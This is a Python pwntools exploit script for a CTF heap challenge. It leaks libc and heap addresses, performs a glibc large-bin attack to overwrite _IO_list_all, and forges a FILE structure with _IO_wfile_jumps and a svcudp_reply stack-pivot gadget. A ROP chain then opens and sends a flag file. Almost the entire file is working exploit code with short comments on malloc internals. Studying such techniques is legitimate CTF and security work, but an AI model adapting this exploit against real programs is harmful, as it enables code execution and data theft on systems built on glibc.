#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
from IO_FILE import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './oneday'
#context.terminal = ['tmux', 'new-window']
#context.terminal = ["tmux", "splitw", "-hb"]
context.terminal = ['tmux', 'new-window']
argv = []
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF("./libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# max 0x10
# 1 = key * 0x110
# 2 = key * 0x110 + 0x10
# 3 = key * 0x110 * 2
idx = -1
def add(option):
    global idx
    io.sendlineafter("command:", str(1))
    io.sendlineafter("choise: ", str(option))

    idx += 1
    return idx

def remove(idx):
    io.sendlineafter("command:", str(2))
    io.sendlineafter("Index:", str(idx))

def edit(idx, msg):
    io.sendlineafter("command:", str(3))
    io.sendlineafter("Index:", str(idx))
    io.sendafter("Message:", msg)

def write(idx):
    io.sendlineafter("command:", str(4))
    io.sendlineafter("Index:", str(idx))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# keys: 6-10

io = start(argv, env=env)
# make sure both chunks we corrupt land in the large bin
io.sendlineafter("key >>", str(8))

p1=add(2) # p1, 0x890
add(1) # prevent consolidation
p2=add(1) # p2, 0x880
add(1) # prevent cosolidation
remove(p1) # free p1 into unsorted
remove(p2) # free p2 into unsorted, p1->bk = p2

write(0)
io.recvline()
leak = u64(io.recv(8))
libc.address = leak - 0x219ce0
heap_base = u64(io.recv(8)) - 0xf80 - 0x440

log.info("Libc: " + hex(libc.address))
log.info("Heap base: " + hex(heap_base))

chunk_p1 = heap_base + 0x290
log.info("chunk p1: " + hex(chunk_p1))

p2 = add(1) # recycle p2

add(3) # 0x550 << 1, put p1 into large bin

remove(p2) # free p2 into unsorted

'''
Head of doubly-linked list of all opened FILE structures
'''
io_all  =  libc.sym['_IO_list_all']
log.info("IO_list_all " + hex(io_all))

wfile_jmps  = libc.sym[ '_IO_wfile_jumps']

log.info("wfile_jumps " + hex(wfile_jmps))

# doesnt seem to be a public symbol in libc
magic_gadget  =  libc.address + 0x16a1e0 + 0x1a
'''
make rax such that rax + 0x28 points to leave,ret gadget
make rbp such that rbp + 0x8 points to start of rop chain


<svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
<svcudp_reply+34>:    lea    r13,[rbp+0x10]
<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
<svcudp_reply+45>:    mov    rdi,r13
<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
'''

log.info("Magic gadget: " + hex(magic_gadget))


# _IO_wfile_overflow --> _IO_wdoallocbuf --> _IO_WDOALLOCATE --> *(fp->_wide_data->_wide_vtable + 0x68)(fp)

lock = libc.address + 0x21ba60

# put rop addr after IO_jump_t
rop_addr  =  chunk_p1  +  0xe0  +  0xe8  +  0x70

pop_rdi_ret  =  next(libc.search(asm ('pop rdi;ret;')))
pop_rsi_ret  =  next(libc.search(asm ('pop rsi;ret;')))
pop_rdx_r12_ret  =  next(libc.search(asm ( 'pop rdx;pop r12;ret;' )))
leave_ret  =  next(libc.search(asm ( 'leave;ret;' )))
pop_rcx_ret = next(libc.search(asm("pop rcx;ret")))

log.info("Rop chain addr: "+ hex(rop_addr))

io_file = IO_FILE_plus()

stream = io_file.construct(
        # rax + 0x28
        read_base=leave_ret,
        # corrupt p1->bk_nextsize
        write_ptr=io_all - 0x20,
        # set rbp such that leave, ret gadget will stack
        # pivot us to our rop chain
        # -0x8 due to pop rbp
        save_base=rop_addr -0x8,
        lock=lock,
        wide_data=chunk_p1+0xe0,
        vtable=wfile_jmps)

# largebin attack overwrites pointer with address of chunk so we we got an offset
# of +0x10
stream = stream[0x10:]

log.info("IO_wide_data " + hex(chunk_p1 + 0xe0))

# _IO_wide_data
# only works when using 0, some values probably require this
stream += p64(0) * 0x1c
# vtable
stream += p64 (chunk_p1 + 0xe0 + 0xe8)

log.info("IO_JUMP_t " + hex(chunk_p1 + 0xe0 + 0xe8))

# _IO_jump_t
stream += p64(0x0)*0xd
# wide_vtable+0x68 will call this gadget with ptr to FILE struct (p1 chunk) in rdi
stream += p64(magic_gadget)

file_str = chunk_p1 + 0x2e0

log.info("file str: " + hex(file_str))

chain = [
    pop_rdx_r12_ret,
    0,
    chunk_p1-0x10, #  set rax to stack pivot gadget (mov rax,QWORD PTR [rbp+0x18])
    pop_rdi_ret,
    file_str,
    pop_rsi_ret,
    0x0,
    libc.sym["open"],
    pop_rdi_ret,
    0x1,
    pop_rsi_ret,
    0x3,
    pop_rdx_r12_ret,
    0x0,
    0x0,
    pop_rcx_ret,
    0x40,
    libc.sym["sendfile"],
    pop_rdi_ret,
    0x0,
    libc.sym["exit"]
]

chain = b"".join([p64(x) for x in chain])

stream += chain
stream += b"/ctf/work/flag".ljust(0x20, b"\x00")


# corrupt p1->bk_nextsize to io_all - 0x20
edit(0, stream.ljust(0x880, b"\x00"))

'''
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
    fwd = bck;
    bck = bck->bk; // bck = p1

    // p2->fd_nextsize = p1->fd
    victim->fd_nextsize = fwd->fd;

    // p2->bk_nextsize = p1->bk_nexsize = io_list - 0x20
    victim->bk_nextsize = fwd->fd->bk_nextsize;

    // p1->bk_nextsize (io_list) = p2
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}

bck = bins header
fwd->fd = p1
bck->bk = p1 since doubly linked list and only 1 chunk?
bck->fd = p1

size = size of p2
bck->bk = points to p1

since p1 > p2, condition is true

victim->fd_nextsize = fwd->fd
    => p2->fd_nextsize = p1->fd

victim->bk_nextsize = p1->bk_nextsize
    => p2->bk_nextsize = io_list - 0x20

fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    => p1->bk_nextsize (io_list) = p2

-0x20 since p1->bk_nextsize is at offset 0x20
'''
# io_list = p2
add(3) # allocate another big chunk to put p2 into large bin

# io_list = p1
add(1)

# trigger chain
io.sendline("5")

io.interactive()
